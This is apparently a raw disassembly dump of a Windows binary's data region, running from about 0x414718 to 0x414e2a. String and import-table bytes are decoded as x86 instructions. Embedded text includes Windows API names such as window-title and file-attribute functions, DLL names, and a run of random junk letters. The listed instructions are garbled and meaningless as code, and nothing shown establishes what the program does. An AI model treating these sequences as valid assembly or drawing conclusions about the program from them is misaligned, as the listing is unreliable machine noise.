  414718:	ins    DWORD PTR es:[edi],dx
  414719:	inc    esp
  41471a:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  414721:	jns    0x41477a
  414723:	add    BYTE PTR [edx+0x4],bh
  414726:	push   esi
  414727:	gs jb  0x41477d
  41472a:	gs je  0x414770
  41472d:	outs   dx,DWORD PTR ds:[esi]
  41472e:	outs   dx,BYTE PTR ds:[esi]
  41472f:	imul   esi,DWORD PTR fs:[ecx+ebp*2+0x6f],0x73614d6e
  414738:	imul   eax,DWORD PTR [eax],0x7
  41473b:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  41473f:	fs dec esp
  414741:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  414748:	js     0x4147a1
  41474a:	add    BYTE PTR [eax],al
  41474c:	pop    edi
  41474d:	add    al,0x54
  41474f:	ins    BYTE PTR es:[edi],dx
  414750:	jae    0x414799
  414752:	gs je  0x4147ab
  414755:	popa   
  414756:	ins    BYTE PTR es:[edi],dx
  414757:	jne    0x4147be
  414759:	add    bl,cl
  41475b:	add    cl,BYTE PTR [ecx+0x73]
  41475e:	inc    edx
  41475f:	popa   
  414760:	fs push edx
  414762:	gs popa 
  414764:	fs push eax
  414766:	je     0x4147da
  414768:	add    BYTE PTR [eax],al
  41476a:	inc    ebx
  41476b:	add    al,BYTE PTR [edi+0x65]
  41476e:	je     0x4147c3
  414770:	push   0x5074726f
  414775:	popa   
  414776:	je     0x4147e0
  414778:	dec    esi
  414779:	popa   
  41477a:	ins    DWORD PTR es:[edi],dx
  41477b:	gs push edi
  41477d:	add    BYTE PTR [edx+eax*1+0x47],dh
  414781:	gs je  0x4147d9
  414784:	jae    0x4147eb
  414786:	jb     0x4147cc
  414788:	gs popaw 
  41478b:	jne    0x4147f9
  41478d:	je     0x4147db
  41478f:	popa   
  414790:	outs   dx,BYTE PTR ds:[esi]
  414791:	addr16 dec ecx
  414793:	inc    esp
  414794:	add    BYTE PTR [eax],al
  414796:	adc    DWORD PTR [ebx],eax
  414798:	dec    esp
  414799:	outs   dx,DWORD PTR ds:[esi]
  41479a:	arpl   WORD PTR [ecx+0x6c],sp
  41479d:	dec    esp
  41479e:	outs   dx,DWORD PTR ds:[esi]
  41479f:	arpl   WORD PTR [ebx+0x0],bp
  4147a2:	mov    ecx,0x6e6f4300
  4147a7:	jbe    0x41480e
  4147a9:	jb     0x41481f
  4147ab:	inc    esp
  4147ac:	gs popaw 
  4147af:	jne    0x41481d
  4147b1:	je     0x4147ff
  4147b3:	outs   dx,DWORD PTR ds:[esi]
  4147b4:	arpl   WORD PTR [ecx+0x6c],sp
  4147b7:	add    BYTE PTR gs:[eax],al
  4147ba:	inc    BYTE PTR [ecx]
  4147bc:	inc    edi
  4147bd:	gs je  0x41480c
  4147c0:	outs   dx,DWORD PTR ds:[esi]
  4147c1:	arpl   WORD PTR [ecx+0x6c],sp
  4147c4:	gs dec ecx
  4147c6:	outs   dx,BYTE PTR ds:[esi]
  4147c7:	outs   dx,WORD PTR ds:[esi]
  4147c9:	inc    ecx
  4147ca:	add    BYTE PTR [eax],al
  4147cc:	loopne 0x4147ce
  4147ce:	inc    ebx
  4147cf:	jb     0x414836
  4147d1:	popa   
  4147d2:	je     0x414839
  4147d4:	dec    ebp
  4147d5:	jne    0x41484b
  4147d7:	gs js  0x414831
  4147da:	add    BYTE PTR [eax],al
  4147dc:	adc    eax,0x74655304
  4147e1:	inc    esi
  4147e2:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x54736970
  4147ea:	outs   dx,DWORD PTR ds:[esi]
  4147eb:	dec    edi
  4147ec:	inc    ebp
  4147ed:	dec    ebp
  4147ee:	add    BYTE PTR [eax],al
  4147f0:	xor    DWORD PTR [ecx],eax
  4147f2:	inc    ebp
  4147f3:	jae    0x414858
  4147f5:	popa   
  4147f6:	jo     0x41485d
  4147f8:	inc    ebx
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	ins    DWORD PTR es:[edi],dx
  4147fb:	ins    DWORD PTR es:[edi],dx
  4147fc:	inc    esi
  4147fd:	jne    0x41486d
  4147ff:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  414803:	outs   dx,BYTE PTR ds:[esi]
  414804:	add    BYTE PTR [eax],al
  414806:	ss add al,0x53
  414809:	gs je  0x414860
  41480c:	push   0x64616572
  414811:	inc    ebx
  414812:	outs   dx,DWORD PTR ds:[esi]
  414813:	outs   dx,BYTE PTR ds:[esi]
  414814:	je     0x41487b
  414816:	js     0x41488c
  414818:	add    BYTE PTR [eax],al
  41481a:	sub    eax,DWORD PTR [ebx]
  41481c:	dec    ebp
  41481d:	outs   dx,DWORD PTR ds:[esi]
  41481e:	jbe    0x414885
  414820:	inc    esi
  414821:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x67004178
  414829:	add    al,BYTE PTR [edi+0x65]
  41482c:	je     0x414882
  41482e:	push   0x64616572
  414833:	dec    esp
  414834:	outs   dx,DWORD PTR ds:[esi]
  414835:	arpl   WORD PTR [ecx+0x6c],sp
  414838:	add    BYTE PTR gs:[ebp+0x4],ch
  41483c:	push   ebp
  41483d:	outs   dx,BYTE PTR ds:[esi]
  41483e:	ins    BYTE PTR es:[edi],dx
  41483f:	outs   dx,DWORD PTR ds:[esi]
  414840:	arpl   WORD PTR [ebx+0x46],bp
  414843:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x41007d00
  41484b:	fs fs inc ecx
  41484e:	je     0x4148bf
  414850:	ins    DWORD PTR es:[edi],dx
  414851:	push   edi
  414852:	add    BYTE PTR [eax],al
  414854:	push   ebp
  414855:	add    al,BYTE PTR [edi+0x65]
  414858:	je     0x4148ad
  41485a:	jns    0x4148cf
  41485c:	je     0x4148c3
  41485e:	ins    DWORD PTR es:[edi],dx
  41485f:	push   esp
  414860:	imul   ebp,DWORD PTR [ebp+0x65],0x756a6441
  414867:	jae    0x4148dd
  414869:	ins    DWORD PTR es:[edi],dx
  41486a:	outs   dx,BYTE PTR gs:[esi]
  41486c:	je     0x41486e
  41486e:	mov    WORD PTR [edi+edx*2],es
  414871:	popa   
  414872:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6c754d72
  41487a:	je     0x4148e5
  41487c:	jo     0x4148ea
  41487e:	gs dec edi
  414880:	bound  ebp,QWORD PTR [edx+0x65]
  414883:	arpl   WORD PTR [ebx+esi*2+0x0],si
  414887:	add    BYTE PTR [ecx+0x2],ah
  41488a:	inc    edi
  41488b:	gs je  0x4148e2
  41488e:	gs ins DWORD PTR es:[edi],dx
  414890:	jo     0x4148e2
  414892:	popa   
  414893:	je     0x4148fd
  414895:	inc    ecx
  414896:	add    BYTE PTR [eax],al
  414898:	out    dx,al
  414899:	add    DWORD PTR [edi+0x65],eax
  41489c:	je     0x4148e4
  41489e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x53],0x657a69
  4148a6:	mov    BYTE PTR [esp+ebp*2],0x73
  4148aa:	je     0x41491e
  4148ac:	arpl   WORD PTR [ebp+0x70],bp
  4148af:	imul   edx,DWORD PTR [edi+0x0],0x6c470290
  4148b6:	outs   dx,DWORD PTR ds:[esi]
  4148b7:	bound  esp,QWORD PTR [ecx+0x6c]
  4148ba:	inc    esi
  4148bb:	jb     0x414922
  4148bd:	add    BYTE PTR gs:[eax],al
  4148c0:	rol    DWORD PTR [eax],1
  4148c2:	inc    ebx
  4148c3:	jb     0x41492a
  4148c5:	popa   
  4148c6:	je     0x41492d
  4148c8:	inc    esi
  4148c9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  4148d1:	outs   dx,BYTE PTR ds:[esi]
  4148d2:	addr16 inc ecx
  4148d4:	add    BYTE PTR [eax],al
  4148d6:	cmp    al,BYTE PTR [ebx]
  4148d8:	dec    edi
  4148d9:	jo     0x414940
  4148db:	outs   dx,BYTE PTR ds:[esi]
  4148dc:	inc    esi
  4148dd:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x52454b00
  4148e5:	dec    esi
  4148e6:	inc    ebp
  4148e7:	dec    esp
  4148e8:	xor    esi,DWORD PTR [edx]
  4148ea:	cs fs ins BYTE PTR es:[edi],dx
  4148ed:	ins    BYTE PTR es:[edi],dx
  4148ee:	add    BYTE PTR [eax],al
  4148f0:	push   ss
  4148f1:	add    BYTE PTR [eax+0x72],dl
  4148f4:	imul   ebp,DWORD PTR [esi+0x74],0x45676c44
  4148fb:	js     0x414954
  4148fd:	add    BYTE PTR [ebx],dl
  4148ff:	add    BYTE PTR [eax+0x61],dl
  414902:	addr16 gs push ebx
  414905:	gs je  0x41497d
  414908:	jo     0x41494e
  41490a:	ins    BYTE PTR es:[edi],dx
  41490b:	addr16 push edi
  41490d:	add    BYTE PTR [edx],al
  41490f:	add    BYTE PTR [ebx+0x68],al
  414912:	outs   dx,DWORD PTR ds:[esi]
  414913:	outs   dx,DWORD PTR ds:[esi]
  414914:	jae    0x41497b
  414916:	inc    ebx
  414917:	outs   dx,DWORD PTR ds:[esi]
  414918:	ins    BYTE PTR es:[edi],dx
  414919:	outs   dx,DWORD PTR ds:[esi]
  41491a:	jb     0x414973
  41491c:	add    BYTE PTR [eax],al
  41491e:	or     al,0x0
  414920:	inc    edi
  414921:	gs je  0x41496a
  414924:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656c7469
  41492c:	push   edi
  41492d:	add    BYTE PTR [edi],cl
  41492f:	add    BYTE PTR [edi+0x65],al
  414932:	je     0x414987
  414934:	popa   
  414935:	jbe    0x41499c
  414937:	inc    esi
  414938:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x41656d61
  414940:	add    BYTE PTR [eax],al
  414942:	arpl   WORD PTR [edi+0x6d],bp
  414945:	fs ins BYTE PTR es:[edi],dx
  414947:	xor    esi,DWORD PTR [bp+si]
  41494a:	cs fs ins BYTE PTR es:[edi],dx
  41494d:	ins    BYTE PTR es:[edi],dx
  41494e:	add    BYTE PTR [eax],al
  414950:	inc    esp
  414951:	add    BYTE PTR [eax+0x61],dl
  414954:	je     0x4149be
  414956:	inc    esi
  414957:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x74736978
  41495f:	jae    0x4149a2
  414961:	add    BYTE PTR [ebx+0x48],dl
  414964:	dec    esp
  414965:	push   edi
  414966:	inc    ecx
  414967:	push   eax
  414968:	dec    ecx
  414969:	cs fs ins BYTE PTR es:[edi],dx
  41496c:	ins    BYTE PTR es:[edi],dx
  41496d:	add    BYTE PTR [ebx+0x70],dh
  414970:	push   ecx
  414971:	dec    edx
  414972:	push   0x47
  414974:	jne    0x4149bc
  414976:	mov    dl,0x4d
  414978:	inc    ecx
  414979:	add    BYTE PTR [edx-0x41ffbeb3],bh
  41497f:	dec    ebx
  414980:	inc    ecx
  414981:	add    bh,ch
  414983:	or     esi,DWORD PTR [edx+0x3a4f710e]
  414989:	dec    edi
  41498a:	ja     0x4149db
  41498c:	cmp    eax,0x304f4f4f
  414991:	dec    edi
  414992:	jb     0x4149e3
  414994:	xor    ecx,DWORD PTR [edi+0x5e]
  414997:	dec    edi
  414998:	ss dec edi
  41499a:	jnp    0x4149eb
  41499c:	sub    DWORD PTR [edi+0x3a],ecx
  41499f:	dec    edi
  4149a0:	sub    cl,BYTE PTR [edi+0x1e]
  4149a3:	push   edx
  4149a4:	pop    ds
  4149a5:	push   ebx
  4149a6:	xor    DWORD PTR [edi+0x71],ecx
  4149a9:	dec    edi
  4149aa:	cmp    cl,BYTE PTR [edi+0x77]
  4149ad:	dec    edi
  4149ae:	cmp    eax,0x304f4f4f
  4149b3:	dec    edi
  4149b4:	jb     0x414a05
  4149b6:	xor    ecx,DWORD PTR [edi+0x5e]
  4149b9:	dec    edi
  4149ba:	ss dec edi
  4149bc:	popa   
  4149bd:	dec    edi
  4149be:	sub    DWORD PTR [edi+0x3a],ecx
  4149c1:	dec    edi
  4149c2:	sub    cl,BYTE PTR [edi+0x1e]
  4149c5:	bound  ebx,QWORD PTR [edi]
  4149c7:	arpl   WORD PTR [ecx],si
  4149c9:	dec    edi
  4149ca:	jno    0x414a1b
  4149cc:	cmp    cl,BYTE PTR [edi+0x6a]
  4149cf:	dec    edi
  4149d0:	cmp    eax,0x314f7b4f
  4149d5:	dec    edi
  4149d6:	dec    esp
  4149d7:	dec    edi
  4149d8:	xor    al,0x4f
  4149da:	cmp    cl,BYTE PTR [edi+0x28]
  4149dd:	dec    edi
  4149de:	push   ds
  4149df:	jb     0x414a00
  4149e1:	jae    0x4149f2
  4149e3:	add    DWORD PTR [eax],0xffffff80
  4149e6:	jo     0x414978
  4149e8:	jno    0x41497b
  4149ea:	aas    
  4149eb:	dec    edi
  4149ec:	jbe    0x414a3d
  4149ee:	cmp    cl,BYTE PTR [edi+0x76]
  4149f1:	dec    edi
  4149f2:	ds dec edi
  4149f4:	dec    esp
  4149f5:	dec    edi
  4149f6:	xor    DWORD PTR [edi+0x7b],ecx
  4149f9:	dec    edi
  4149fa:	xor    eax,0x364f3a4f
  4149ff:	dec    edi
  414a00:	push   ds
  414a01:	sbb    BYTE PTR [edi],0x83
  414a04:	setae  BYTE PTR [eax]
  414a07:	nop
  414a08:	jo     0x4149aa
  414a0a:	jno    0x4149ad
  414a0c:	aas    
  414a0d:	dec    edi
  414a0e:	jbe    0x414a5f
  414a10:	cmp    cl,BYTE PTR [edi+0x76]
  414a13:	dec    edi
  414a14:	ds dec edi
  414a16:	dec    esp
  414a17:	dec    edi
  414a18:	xor    DWORD PTR [edi+0x61],ecx
  414a1b:	dec    edi
  414a1c:	xor    eax,0x364f3a4f
  414a21:	dec    edi
  414a22:	push   ds
  414a23:	xchg   edx,eax
  414a24:	pop    ds
  414a25:	xchg   ebx,eax
  414a26:	bt     DWORD PTR [eax],eax
  414a29:	mov    al,ds:0xb171b070
  414a2e:	aas    
  414a2f:	dec    edi
  414a30:	pusha  
  414a31:	dec    edi
  414a32:	cmp    cl,BYTE PTR [edi+0x4e]
  414a35:	dec    edi
  414a36:	cmp    eax,0x314f7b4f
  414a3b:	dec    edi
  414a3c:	dec    ecx
  414a3d:	dec    edi
  414a3e:	xor    al,0x4f
  414a40:	cmp    cl,BYTE PTR [edi+0x36]
  414a43:	dec    edi
  414a44:	push   ds
  414a45:	mov    ds:0xb30fa31f,al
  414a4a:	add    BYTE PTR [eax-0x3e8e3f90],dh
  414a50:	aas    
  414a51:	dec    edi
  414a52:	pusha  
  414a53:	dec    edi
  414a54:	cmp    cl,BYTE PTR [edi+0x4e]
  414a57:	dec    edi
  414a58:	cmp    eax,0x314f704f
  414a5d:	dec    edi
  414a5e:	pop    edi
  414a5f:	dec    edi
  414a60:	xor    ecx,DWORD PTR [edi+0x3a]
  414a63:	dec    edi
  414a64:	xor    eax,0x1fb21e4f
  414a69:	mov    bl,0xf
  414a6b:	ret    
  414a6c:	add    al,al
  414a6e:	jo     0x414a40
  414a70:	jno    0x414a43
  414a72:	aas    
  414a73:	dec    edi
  414a74:	pusha  
  414a75:	dec    edi
  414a76:	cmp    cl,BYTE PTR [edi+0x4e]
  414a79:	dec    edi
  414a7a:	cmp    eax,0x314f6a4f
  414a7f:	dec    edi
  414a80:	dec    esi
  414a81:	dec    edi
  414a82:	xor    al,0x4f
  414a84:	cmp    cl,BYTE PTR [edi+0x28]
  414a87:	dec    edi
  414a88:	push   ds
  414a89:	ret    0xc31f
  414a8c:	psrlq  mm0,QWORD PTR [eax]
  414a8f:	shl    BYTE PTR [eax-0x20],1
  414a92:	jno    0x414a75
  414a94:	aas    
  414a95:	dec    edi
  414a96:	pusha  
  414a97:	dec    edi
  414a98:	cmp    cl,BYTE PTR [edi+0x4e]
  414a9b:	dec    edi
  414a9c:	cmp    eax,0x314f6b4f
  414aa1:	dec    edi
  414aa2:	dec    esp
  414aa3:	dec    edi
  414aa4:	xor    al,0x4f
  414aa6:	cmp    cl,BYTE PTR [edi+0x36]
  414aa9:	dec    edi
  414aaa:	push   ds
  414aab:	rcr    BYTE PTR [edi],cl
  414aad:	ror    DWORD PTR [edi],cl
  414aaf:	jecxz  0x414ab1
  414ab1:	loopne 0x414b23
  414ab3:	lock jno 0x414aa7
  414ab6:	aas    
  414ab7:	dec    edi
  414ab8:	ins    DWORD PTR es:[edi],dx
  414ab9:	dec    edi
  414aba:	cmp    cl,BYTE PTR [edi+0x5f]
  414abd:	dec    edi
  414abe:	cmp    eax,0x3e4f4a4f
  414ac3:	dec    edi
  414ac4:	cmp    cl,BYTE PTR [edi+0x3f]
  414ac7:	dec    edi
  414ac8:	push   ds
  414ac9:	loop   0x414aea
  414acb:	jecxz  0x414adc
  414acd:	repz add al,dh
  414ad0:	jo     0x414ad2
  414ad2:	jno    0x414ad5
  414ad4:	jo     0x414ae6
  414ad6:	jno    0x414ae9
  414ad8:	ds dec edi
  414ada:	jg     0x414b2b
  414adc:	cmp    cl,BYTE PTR [edi+0x53]
  414adf:	dec    edi
  414ae0:	cmp    al,0x4f
  414ae2:	push   0x4f
  414ae4:	ds dec edi
  414ae6:	dec    ebp
  414ae7:	dec    edi
  414ae8:	xor    ecx,DWORD PTR [edi+0x3a]
  414aeb:	dec    edi
  414aec:	xor    eax,0x1f021e4f
  414af1:	add    ecx,DWORD PTR [edi]
  414af3:	adc    eax,DWORD PTR [eax]
  414af5:	adc    BYTE PTR [eax+0x20],dh
  414af8:	jno    0x414b1b
  414afa:	aas    
  414afb:	dec    edi
  414afc:	add    BYTE PTR [eax],al
  414afe:	xchg   BYTE PTR [ecx+0x41],cl
  414b01:	add    BYTE PTR [edx+0x4b],bh
  414b04:	inc    ecx
  414b05:	add    BYTE PTR [edx-0x41ffbeb5],al
  414b0b:	dec    ebp
  414b0c:	inc    ecx
  414b0d:	add    BYTE PTR [esi],ah
  414b0f:	dec    ebp
  414b10:	inc    ecx
  414b11:	add    BYTE PTR [esi+0x6200414d],ch
  414b17:	dec    ebx
  414b18:	inc    ecx
  414b19:	add    BYTE PTR [esi+0x4b],ah
  414b1c:	inc    ecx
  414b1d:	add    BYTE PTR [esi-0x35ffbeb3],ah
  414b23:	dec    ebx
  414b24:	inc    ecx
  414b25:	add    BYTE PTR [ecx-0x49076357],dh
  414b2b:	mov    edx,0x4b7ef89c
  414b30:	inc    ecx
  414b31:	add    dh,bl
  414b33:	dec    esp
  414b34:	inc    ecx
  414b35:	add    dl,dh
  414b37:	dec    esp
  414b38:	inc    ecx
  414b39:	add    dh,bh
  414b3b:	dec    esp
  414b3c:	inc    ecx
  414b3d:	add    BYTE PTR [esi],cl
  414b3f:	dec    ebp
  414b40:	inc    ecx
  414b41:	add    BYTE PTR [esi-0x7dffbeb5],dh
  414b47:	dec    ecx
  414b48:	inc    ecx
  414b49:	add    dh,dl
  414b4b:	dec    ebx
  414b4c:	inc    ecx
  414b4d:	add    dh,al
  414b4f:	dec    ebx
  414b50:	inc    ecx
  414b51:	add    dl,al
  414b53:	dec    ebp
  414b54:	inc    ecx
  414b55:	add    BYTE PTR [esi],dh
  414b57:	test   DWORD PTR [eax+edi*8-0x7ee8f463],ebx
  414b5e:	mov    cl,BYTE PTR [ebx+0x41]
  414b61:	add    BYTE PTR [eax-0x737ee9e4],bl
  414b67:	or     eax,0x705
  414b6c:	inc    eax
  414b6d:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  414b71:	fstp   QWORD PTR [ebx+0x46]
  414b74:	inc    ebx
  414b75:	add    BYTE PTR [edx+0x68],dh
  414b78:	inc    ebp
  414b79:	inc    ecx
  414b7a:	mov    edx,?
  414b7c:	jne    0x414be0
  414b7e:	mov    ebp,gs
  414b80:	inc    BYTE PTR [edi]
  414b82:	mov    edi,0x7205a3fa
  414b87:	dec    ebx
  414b88:	inc    ecx
  414b89:	add    BYTE PTR [ecx],bh
  414b8b:	xchg   ebp,eax
  414b8c:	pushf  
  414b8d:	clc    
  414b8e:	cmp    DWORD PTR [esi-0x6ac70764],edx
  414b94:	pushf  
  414b95:	clc    
  414b96:	cmp    edx,DWORD PTR [ebp-0x6ac50764]
  414b9c:	pushf  
  414b9d:	clc    
  414b9e:	cmp    eax,0x3cf89c95
  414ba3:	xchg   ebp,eax
  414ba4:	pushf  
  414ba5:	clc    
  414ba6:	aas    
  414ba7:	xchg   ebp,eax
  414ba8:	pushf  
  414ba9:	clc    
  414baa:	ds xchg ebp,eax
  414bac:	pushf  
  414bad:	clc    
  414bae:	and    DWORD PTR [ebp-0x6ad90764],edx
  414bb4:	pushf  
  414bb5:	clc    
  414bb6:	jmp    0x4149:0x7a6003f9
  414bbd:	add    BYTE PTR [ecx+edx*1],dh
  414bc0:	inc    ebx
  414bc1:	add    BYTE PTR [ecx+0x49],bl
  414bc4:	imul   si,WORD PTR [esi],0xff85
  414bc8:	pushf  
  414bc9:	clc    
  414bca:	popf   
  414bcb:	jmp    0xac75320
  414bd0:	add    BYTE PTR [eax],al
  414bd2:	jbe    0x414c1d
  414bd4:	inc    ecx
  414bd5:	add    BYTE PTR [ebx+0xe040b],bl
	...
  414c0b:	adc    BYTE PTR [eax+0x0],al
  414c0e:	pop    eax
  414c0f:	and    DWORD PTR [ebx+0x0],eax
  414c12:	add    BYTE PTR [eax],al
  414c14:	add    BYTE PTR [eax],al
  414c16:	dec    ecx
  414c17:	add    BYTE PTR [eax+eax*1+0x69],al
  414c1b:	add    BYTE PTR [eax+eax*1+0x4b],ah
  414c1f:	add    BYTE PTR [edx+0x0],cl
  414c22:	dec    ebx
  414c23:	add    BYTE PTR [edx+0x0],cl
  414c26:	inc    esp
  414c27:	add    BYTE PTR [ebx+0x0],ch
  414c2a:	ins    BYTE PTR es:[edi],dx
  414c2b:	add    BYTE PTR [edx+0x0],ch
  414c2e:	inc    esp
  414c2f:	add    BYTE PTR [eax+eax*1+0x49],cl
  414c33:	add    BYTE PTR [eax+eax*1+0x4c],al
  414c37:	add    BYTE PTR [ecx+0x0],cl
  414c3a:	push   ebp
  414c3b:	add    BYTE PTR [edx+0x0],cl
  414c3e:	dec    ebx
  414c3f:	add    BYTE PTR [eax+eax*1+0x4c],al
  414c43:	add    BYTE PTR [edx+0x0],cl
  414c46:	dec    ebx
  414c47:	add    BYTE PTR [eax+0x0],cl
  414c4a:	inc    esp
  414c4b:	add    BYTE PTR [edx+0x0],cl
	...
  414c56:	imul   ebp,DWORD PTR fs:[edx+0x73],0x6b
  414c5b:	ins    BYTE PTR es:[edi],dx
  414c5c:	popa   
  414c5d:	imul   ebp,DWORD PTR [edx+ebp*2+0x4c],0x4b
  414c62:	dec    ecx
  414c63:	dec    edx
  414c64:	inc    esp
  414c65:	inc    esi
  414c66:	ins    BYTE PTR es:[edi],dx
  414c67:	imul   ebp,DWORD PTR [ebx+0x75],0x736c6466
  414c6e:	imul   ebp,DWORD PTR [ecx+0x68],0x67
  414c72:	ins    BYTE PTR es:[edi],dx
  414c73:	jae    0x414ce0
  414c75:	push   0x66
  414c77:	ins    BYTE PTR es:[edi],dx
  414c78:	imul   ecx,DWORD PTR [edx+0x4b],0x44
  414c7c:	imul   sp,WORD PTR [esi+eiz*2+0x68],0x73
  414c82:	imul   esp,DWORD PTR [edi+0x66],0x68
  414c86:	jae    0x414cec
  414c88:	imul   esi,DWORD PTR [ebp+0x6b],0x64756679
  414c8f:	imul   esi,DWORD PTR [ebx+0x6b],0x486a6b68
  414c96:	dec    ebx
  414c97:	dec    edx
  414c98:	inc    esp
  414c99:	inc    esi
  414c9a:	push   0x756b7364
  414c9f:	outs   dx,DWORD PTR ds:[si]
  414ca1:	imul   esi,DWORD PTR [ebx+0x66],0x6b677564
  414ca8:	push   0x66
  414caa:	fs jae 0x414d15
  414cad:	imul   ebp,DWORD PTR [si+0x66],0x68
  414cb2:	ins    BYTE PTR es:[edi],dx
  414cb3:	imul   esp,DWORD PTR [edi+0x6a],0x75
  414cb7:	push   0x6a6b6466
  414cbc:	jne    0x414d25
  414cbe:	jns    0x414d24
  414cc0:	imul   si,WORD PTR [di+0x66],0x6764
  414cc7:	jne    0x414d35
  414cc9:	fs pushw 0x6c67
  414cce:	push   0x68
  414cd0:	data16 add BYTE PTR fs:[eax],al
  414cd4:	add    BYTE PTR [eax],al
  414cd6:	add    BYTE PTR [eax],al
  414cd8:	add    BYTE PTR [eax],al
  414cda:	xor    edx,DWORD PTR [ebx]
  414cdc:	inc    ecx
  414cdd:	add    BYTE PTR [ebp+0x4f],dl
  414ce0:	pop    edi
  414ce1:	dec    edi
  414ce2:	dec    esp
  414ce3:	dec    edi
  414ce4:	dec    eax
  414ce5:	dec    edi
  414ce6:	pop    edi
  414ce7:	dec    edi
  414ce8:	push   esi
  414ce9:	dec    edi
  414cea:	or     eax,0x3a4f0c4f
  414cef:	dec    edi
  414cf0:	add    BYTE PTR [eax],al
  414cf2:	push   ecx
  414cf3:	dec    edi
  414cf4:	pop    esi
  414cf5:	dec    edi
  414cf6:	push   ebx
  414cf7:	dec    edi
  414cf8:	or     eax,0x3a4f0c4f
  414cfd:	dec    edi
  414cfe:	dec    edi
  414cff:	dec    edi
  414d00:	dec    ebp
  414d01:	dec    edi
  414d02:	pop    edi
  414d03:	dec    edi
  414d04:	dec    esp
  414d05:	dec    edi
  414d06:	or     eax,0x3a4f0c4f
  414d0b:	dec    edi
  414d0c:	add    BYTE PTR [eax],al
  414d0e:	dec    ebp
  414d0f:	dec    edi
  414d10:	push   edx
  414d11:	dec    edi
  414d12:	push   esi
  414d13:	dec    edi
  414d14:	inc    ecx
  414d15:	dec    edi
  414d16:	pop    ebx
  414d17:	dec    edi
  414d18:	dec    edx
  414d19:	dec    edi
  414d1a:	push   ebx
  414d1b:	dec    edi
  414d1c:	cmp    cl,BYTE PTR [edi+0x0]
  414d1f:	add    BYTE PTR [eax],al
  414d21:	add    BYTE PTR [eax],al
  414d23:	add    BYTE PTR [eax],al
  414d25:	add    BYTE PTR [esi+0x7d],ch
  414d28:	outs   dx,BYTE PTR ds:[esi]
  414d29:	lea    ebp,[esi-0x63]
  414d2c:	outs   dx,BYTE PTR ds:[esi]
  414d2d:	lods   eax,DWORD PTR ds:[esi]
  414d2e:	outs   dx,BYTE PTR ds:[esi]
  414d2f:	mov    ebp,0xdd6ecd6e
  414d34:	outs   dx,BYTE PTR ds:[esi]
  414d35:	in     eax,dx
  414d36:	outs   dx,BYTE PTR ds:[esi]
  414d37:	std    
  414d38:	outs   dx,BYTE PTR ds:[esi]
  414d39:	or     eax,0x2d6e1d6e
  414d3e:	outs   dx,BYTE PTR ds:[esi]
  414d3f:	cmp    eax,0x6d6e5d6e
  414d44:	outs   dx,BYTE PTR ds:[esi]
  414d45:	jb     0x414db5
  414d47:	jae    0x414db7
  414d49:	jo     0x414db9
  414d4b:	jno    0x414dbb
  414d4d:	jbe    0x414dbd
  414d4f:	ja     0x414dbf
  414d51:	je     0x414dc1
  414d53:	jne    0x414dc3
  414d55:	mov    ch,BYTE PTR [esi-0x75]
  414d58:	outs   dx,BYTE PTR ds:[esi]
  414d59:	mov    BYTE PTR [esi-0x77],ch
  414d5c:	outs   dx,BYTE PTR ds:[esi]
  414d5d:	mov    gs,WORD PTR [esi+0x7c]
  414d60:	pop    esi
  414d61:	jge    0x414db1
  414d63:	jge    0x414d23
  414d65:	jge    0x414db7
  414d67:	(bad)  
  414d68:	jno    0x414dda
  414d6a:	mov    cl,0xb1
  414d6c:	outs   dx,BYTE PTR ds:[esi]
  414d6d:	jae    0x414dec
  414d6f:	bound  esp,QWORD PTR [edx+0x7c265fc6]
  414d75:	add    BYTE PTR [ecx+0x17],al
  414d78:	mov    bl,0x56
  414d7a:	mov    cl,0xf4
  414d7c:	inc    edx
  414d7d:	aaa    
  414d7e:	inc    edx
  414d7f:	jle    0x414d12
  414d81:	jno    0x414ddb
  414d83:	mov    cl,0x4
  414d85:	imul   esp,DWORD PTR [eax-0x70282bf8],0x5
  414d8c:	inc    esp
  414d8d:	xlat   BYTE PTR ds:[ebx]
  414d8e:	leave  
  414d8f:	xchg   ebx,eax
  414d90:	inc    eax
  414d91:	adc    eax,ecx
  414d93:	jge    0x414d60
  414d95:	faddp  st(7),st
  414d97:	leave  
  414d98:	xchg   BYTE PTR [esi+0x1fa23208],ah
  414d9e:	fs icebp 
  414da0:	dec    eax
  414da1:	(bad)  
  414da2:	leave  
  414da3:	sbb    cl,cl
  414da5:	jno    0x414d93
  414da7:	(bad)  [ebx+0x7]
  414daa:	ror    BYTE PTR [ebx+0x41],cl
  414dad:	add    BYTE PTR [ebp+0x2f],al
  414db0:	shl    BYTE PTR [edx],0x2c
  414db3:	xor    eax,DWORD PTR [ecx+0x0]
  414db6:	inc    esi
  414db7:	push   ebx
  414db8:	outs   dx,DWORD PTR ds:[esi]
  414db9:	push   ebx
  414dba:	push   0x4b
  414dbc:	inc    ecx
  414dbd:	add    dh,cl
  414dbf:	dec    ebx
  414dc0:	inc    ecx
  414dc1:	add    BYTE PTR [ebp+ebp*8+0x712],cl
	...
  414de4:	add    BYTE PTR [eax],al
  414de6:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  414ded:	pop    ecx
  414dee:	outs   dx,BYTE PTR ds:[esi]
  414def:	jbe    0x414e69
  414df1:	jns    0x414e47
  414df3:	push   ecx
  414df4:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  414df8:	je     0x414e5b
	...
  414e0e:	jp     0x414e64
  414e10:	arpl   WORD PTR [ecx+0x4b],cx
  414e13:	push   edx
  414e14:	imul   ebp,DWORD PTR [eax+0x53],0x4746536f
  414e1b:	push   0x66495949
  414e20:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  414e24:	push   esi
  414e25:	jb     0x414e8f
  414e27:	add    BYTE PTR [ebx+0x51],al
  414e2a:	ins    BYTE PTR es:[edi],dx
